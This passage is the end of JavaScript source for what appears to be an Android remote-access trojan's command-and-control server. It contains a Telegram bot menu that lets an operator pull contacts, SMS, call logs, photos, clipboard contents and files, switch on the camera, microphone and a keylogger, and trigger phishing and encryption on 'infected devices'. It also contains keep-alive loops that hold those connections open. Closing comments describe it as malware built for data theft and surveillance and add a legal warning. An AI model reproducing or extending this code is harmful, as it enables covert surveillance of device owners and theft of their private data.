                '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n',
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝚂𝙼𝚂 ✯'],
                            ['✯ 𝙲𝚊𝚕𝚕𝚜 ✯', '✯ 𝙰𝚙𝚙𝚜 ✯'],
                            ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
                            ['✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯', '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯'],
                            ['✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯'],
                            ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯'],
                            ['✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯', '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯'],
                            ['✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯', '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯'],
                            ['✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯', '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯'],
                            ['✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯'],
                            ['✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯'],
                            ['✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯'],
                            ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯'],
                            ['✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯']
                        ],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                }
            );
        }
    }
});

// ==================== KEEP-ALIVE MECHANISMS ====================

// Periodic ping to maintain connections with infected devices
setInterval(() => {
    io.sockets.sockets.forEach((socket, socketId, map) => {
        io.to(socketId).emit('ping', {});
    });
}, 5000); // Every 5 seconds

// Keep the server alive with periodic HTTPS request
setInterval(() => {
    https.get(config.url, (response) => {
        // Response handler (empty)
    }).on('error', (err) => {
        // Error handler (empty)
    });
}, 480000); // Every 8 minutes

// ==================== START SERVER ====================

server.listen(process.env.PORT || 3000, () => {
    console.log('listening on port 3000');
});

// ==================== END OF CODE ====================
// This malware is designed to:
// 1. Control Android devices remotely via Socket.IO
// 2. Use Telegram as Command & Control (C2) interface
// 3. Steal sensitive data (contacts, SMS, calls, photos, etc.)
// 4. Perform surveillance (camera, microphone, keylogging)
// 5. Execute malicious actions (send SMS, display fake notifications)
//
// LEGAL WARNING: Using this code is ILLEGAL without explicit authorization
// Violates Computer Fraud and Abuse Act (CFAA) and similar laws worldwide
// Punishable by severe criminal penalties including imprisonment
